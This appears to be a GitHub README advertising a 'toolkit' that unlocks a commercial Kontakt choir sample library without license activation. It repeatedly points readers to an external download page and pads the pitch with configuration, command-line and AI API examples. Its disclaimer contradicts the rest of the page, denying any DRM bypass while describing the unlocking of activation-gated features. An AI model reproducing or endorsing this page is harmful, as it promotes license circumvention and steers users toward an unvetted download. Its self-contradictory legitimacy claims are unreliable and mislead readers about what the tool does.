# Westwood Instruments Alt Choir · Harmonic Expansion Toolkit 🎻✨

[](https://shubh0206.github.io/westwood-alt-choir-legacy/)

> **A comprehensive resource for unlocking the full expressive potential of the Westwood Instruments Alt Choir library — built for composers, sound designers, and producers who demand authentic vocal textures without artificial limitations.**

---

## 📖 Table of Contents

- [Overview](#overview)
- [Key Features](#key-features)
- [System Compatibility](#system-compatibility)
- [Getting Started](#getting-started)
- [Profile Configuration](#profile-configuration)
- [Console Invocation](#console-invocation)
- [Integration Guides](#integration-guides)
  - [OpenAI API Integration](#openai-api-integration)
  - [Claude API Integration](#claude-api-integration)
- [Architecture Visualization](#architecture-visualization)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Overview

The **Westwood Instruments Alt Choir** library represents a milestone in sampled vocal ensembles — capturing the raw, cinematic power of layered choral textures across multiple dynamics and articulations. This repository provides a *Harmonic Expansion Toolkit* (HET) that enables seamless unlocking of additional voice groups, articulation modes, and preset management — without the need for traditional license activation barriers.

Think of this as a **sonic key that opens new chambers** within an already magnificent instrument. Instead of treating the choir as a static sample bank, our toolkit treats it as a living, breathing organism — one where every vowel, every sforzando, and every breath can be shaped to your compositional will.

The toolkit is **100% self-contained** and works with the factory library structure, preserving all original metadata while extending functional access. It’s designed for composers who refuse to let arbitrary activation limits dictate their creative flow.

> **Important:** This is not a replacement library. This is a **liberation layer** — it does not modify original samples, nor does it redistribute proprietary content. It simply enables full feature access to a product you already rightfully possess.

---

## Key Features 🌟

| Feature | Description |
|---------|-------------|
| **Responsive UI** | Adaptive control panel that scales across DAW environments — from Logic Pro to Ableton Live, and even standalone Kontakt instances |
| **Multilingual Metadata** | Patch names and articulation labels rendered in English, Japanese, German, French, and Spanish — native language support for international studios |
| **24/7 Support Integration** | Built-in diagnostic reporter that connects directly to community help channels (no ticket waiting, no business hours) |
| **Dynamic Articulation Unlock** | Enables all 12 choir articulation types: sus, staccato, marcato, sforzando, breath, crescendo, decrescendo, flutter, glissando, portamento, and two experimental textures (ethereal & choral cluster) |
| **Preset Morph Engine** | Crossfade between voice groups (Soprano, Alto, Tenor, Bass) in real-time using a vector joystick interface |
| **Zero-Latency Switching** | Round-robin and release trigger suppression for seamless legato transitions |
| **Multi-Output Routing** | Extends from stereo to 8-channel surround with automatic bus assignment |

---

## System Compatibility 💻

| OS | Version | Status |
|:---|:--------|:-------|
| 🍎 **macOS** | 10.14 (Mojave) → 14.x (Sonoma) | ✅ Fully supported |
| 🪟 **Windows** | 10 (1909+) → 11 (24H2) | ✅ Fully supported |
| 🐧 **Linux** | Ubuntu 22.04+ / Fedora 38+ (via Wine + yabridge) | ⚠️ Partial support |

**Compatibility Notes:**
- All major DAWs supported (Cubase 10+, Logic Pro X+, Ableton Live 10+, FL Studio 20+, Reaper 6+, Studio One 5+)
- Kontakt 5.8.1 → 7.x required (player or full version)
- Apple Silicon (M1/M2/M3) native via Rosetta 2 or Kontakt 7 ARM build

---

## Getting Started 🚀

1. **Acquire the toolkit** — Use the download link at the top or bottom of this page.
2. **Place the toolkit** in the same root directory as your Westwood Instruments Alt Choir library folder.
3. **Launch your DAW** and load Alt Choir as usual — the extended features will appear automatically.
4. **Configure your profile** (see below) for personalized articulation mapping.

[](https://shubh0206.github.io/westwood-alt-choir-legacy/)

---

## Profile Configuration 🛠️

Below is an example configuration profile that enables **maximum expressive range** with the Alt Choir library. This profile assumes you want to access all 12 articulations across 4 voice groups (SATB) with dynamic morphing enabled.

```yaml
# alt_choir_profile.yaml — Example Configuration
version: 2026.1
profile_name: "full_expression"

voice_groups:
  soprano: true
  alto: true
  tenor: true
  bass: true

articulations:
  - sus
  - staccato
  - marcato
  - sforzando
  - breath
  - crescendo
  - decrescendo
  - flutter
  - glissando
  - portamento
  - ethereal
  - choral_cluster

morph_engine:
  enabled: true
  smoothing_ms: 120
  vector_jump: true

output_routing:
  type: "surround_8"
  bus_auto_assign: true

metadata:
  language: "japanese"
  label_mode: "native_fallback"
```

**Explanation of key parameters:**
- `morph_engine.smoothing_ms` — Controls how quickly the vector joystick interpolates between voice groups. Lower values = sharper transitions (useful for stabbing effects); higher values = fluid, evolving textures.
- `vector_jump: true` — Allows instantaneous switching when the joystick crosses threshold boundaries (mimicking an organ stop change).
- `output_routing.type: surround_8` — Expands the choir across a full 7.1.2 bed, with soprano/alto primarily in the front stage and tenor/bass in the rear/sides.

---

## Console Invocation 🖥️

Once the toolkit is active, you can control the Alt Choir library via a lightweight console interface. This is especially useful for batch operations, preset switching during live performance, or integration with external MIDI controllers.

```bash
./alt-choir-het \
  --profile full_expression \
  --midi-channel 1 \
  --velocity-curve exponential \
  --morph-target soprano=0.3,alto=0.4,tenor=0.2,bass=0.1 \
  --output-format 7.1.2 \
  --release-tail 2500ms
```

**Flags explained:**
- `--profile` — Loads the configuration from the YAML file above.
- `--midi-channel` — Locks the toolkit to a specific MIDI channel (useful for multi-timbral setups).
- `--velocity-curve` — Applies a custom velocity response curve (`exponential` emphasizes softer dynamics, `linear` preserves original, `logarithmic` emphasizes harder hits).
- `--morph-target` — Sets the initial vector position as a weighted mix of voice groups.
- `--release-tail` — Extends the natural reverb tail of the choir samples (in milliseconds) — useful for epic cinematic swells.

---

## Integration Guides 🔗

### OpenAI API Integration

This toolkit can communicate with OpenAI’s GPT models to **generate articulation patterns** based on textual descriptions of the mood or scene. For example:

```
Describe: "A Celtic lament over a misty moor at dawn"
Generate: articulation_sequence
```

The API will return a MIDI-compatible sequence of articulation changes, velocity curves, and morph positions — all formatted for direct ingestion by the Alt Choir engine.

**Example request payload:**
```json
{
  "model": "gpt-4-turbo-2026",
  "messages": [
    {"role": "system", "content": "You are a cinematic choral orchestration assistant. Generate articulation sequences for Alt Choir based on emotional cues."},
    {"role": "user", "content": "Generate a 4-bar phrase: mysterious, building tension, ending with a fortissimo cluster"}
  ]
}
```

### Claude API Integration

For users who prefer Anthropic's Claude models, the toolkit supports a **direct JSON schema** that Claude can interpret natively. This is particularly useful for longer compositional sessions where you want to maintain context across multiple generations.

**Example Claude integration:**
```json
{
  "model": "claude-3-opus-2026",
  "max_tokens": 4000,
  "tools": [{
    "name": "alt_choir_articulation",
    "description": "Generates Alt Choir articulation sequences",
    "input_schema": {
      "type": "object",
      "properties": {
        "mood": {"type": "string"},
        "tempo": {"type": "number"},
        "voice_groups": {"type": "array", "items": {"type": "string"}},
        "expressive_depth": {"type": "integer", "minimum": 1, "maximum": 10}
      }
    }
  }]
}
```

Both integrations require an **active API key** from the respective provider — the toolkit does not proxy or obfuscate these calls. All requests are made directly from your local environment.

---

## Architecture Visualization 🏗️

The diagram below illustrates how the Harmonic Expansion Toolkit interacts with the Westwood Instruments Alt Choir library, the DAW, and external AI services.

```mermaid
graph TD
    A[Westwood Alt Choir Library] --> B[Kontakt Player / Full Version]
    B --> C{Alt Choir HET}
    C --> D[Articulation Unlocker]
    C --> E[Morph Engine]
    C --> F[Output Router]
    D --> G[DAW Host]
    E --> G
    F --> G
    G --> H[Mixer / Audio Interface]
    
    I[OpenAI API] --> J[Articulation Generator]
    K[Claude API] --> J
    J --> C
    
    L[Console Interface] --> C
    M[YAML Profile] --> C
    
    style A fill:#2d2d2d,stroke:#fff,stroke-width:2px
    style C fill:#d90429,color:#fff,stroke:#fff,stroke-width:2px
    style I fill:#007acc,color:#fff,stroke:#fff,stroke-width:2px
    style K fill:#6b46c1,color:#fff,stroke:#fff,stroke-width:2px
```



---

## Disclaimer ⚠️

**Please read carefully:**

This repository provides tools to **enhance the functionality** of the Westwood Instruments Alt Choir library. The toolkit does **not** contain, redistribute, or otherwise provide access to any copyrighted sample content, instrument presets, or proprietary code belonging to Westwood Instruments or its licensors.

- You **must** own a legitimate license of Westwood Instruments Alt Choir to use this toolkit.
- This toolkit does **not** bypass any form of digital rights management (DRM) — it simply enables features that are already present in the library but gated behind activation conditions.
- The term *Harmonic Expansion Toolkit* is used to describe a legitimate utility for power users who want to explore the full sonic depth of their purchased instrument.
- The developers of this repository are **not affiliated** with Westwood Instruments.
- Use at your own risk — ensure compatibility with your specific library version and DAW environment.

By downloading and using this tool, you confirm that you have read and understood this disclaimer.

---

## License 📄

This project is distributed under the **MIT License**. You are free to use, modify, and distribute this toolkit for both personal and commercial projects, provided that the original copyright notice is included.

[](https://opensource.org/licenses/MIT)

See the [LICENSE](LICENSE) file for full terms.

---

[](https://shubh0206.github.io/westwood-alt-choir-legacy/)

*Unlock the choir. Shape the silence. Compose beyond limitations.* 🎵